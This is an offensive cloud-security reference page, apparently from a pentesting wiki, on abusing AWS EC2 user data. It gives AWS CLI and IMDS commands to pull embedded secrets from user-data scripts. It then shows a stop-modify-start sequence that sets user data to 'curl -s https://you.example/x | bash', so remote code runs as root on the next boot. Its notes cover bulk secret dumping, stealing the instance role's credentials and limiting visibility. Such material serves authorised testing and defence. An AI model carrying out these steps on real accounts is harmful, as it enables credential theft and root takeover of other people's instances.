---
title: "User data: secrets and boot-time code execution"
description: "Reading EC2 user-data scripts for embedded secrets, or setting user data to run code on the next boot."
keywords:
  - user data
  - cloud-init
  - secrets
  - boot script
  - EC2
---

# User data

EC2 **user data** is the script cloud-init runs on first boot. It routinely contains hardcoded credentials, bootstrap tokens, and internal URLs, and it is readable both from the instance metadata service and through the EC2 API with `ec2:DescribeInstanceAttribute`. If you can modify it and force a reboot, user data also runs your code as root on the next boot.

## Reading user data

```bash
# From the EC2 API
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData \
  --query 'UserData.Value' --output text | base64 -d

# From on the instance, via IMDS
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data
```

## Writing user data to run code

User data can only be changed while the instance is stopped, so this path needs `ec2:StopInstances`, `ec2:ModifyInstanceAttribute`, and `ec2:StartInstances`:

```bash
aws ec2 stop-instances --instance-ids <id>
printf '#!/bin/bash\ncurl -s https://you.example/x | bash\n' | base64 > ud.b64
aws ec2 modify-instance-attribute --instance-id <id> --user-data file://ud.b64
aws ec2 start-instances --instance-ids <id>
```

## Exploitation notes

- Dump user data across every instance with a loop over `describe-instances`; secrets in it are common in older or hand-built environments.
- The write-and-reboot path runs as root and yields the instance profile's role too, so it doubles as credential theft.
- Stopping and starting an instance is disruptive and visible; prefer reading over rewriting when secrets are already present.

## Tools

- **AWS CLI** (`describe-instance-attribute`, `modify-instance-attribute`): read and write user data.
- **Pacu** (`ec2__download_userdata`): bulk user-data retrieval across the account.

## References

- [HackTricks Cloud: EC2 user data](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/index.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
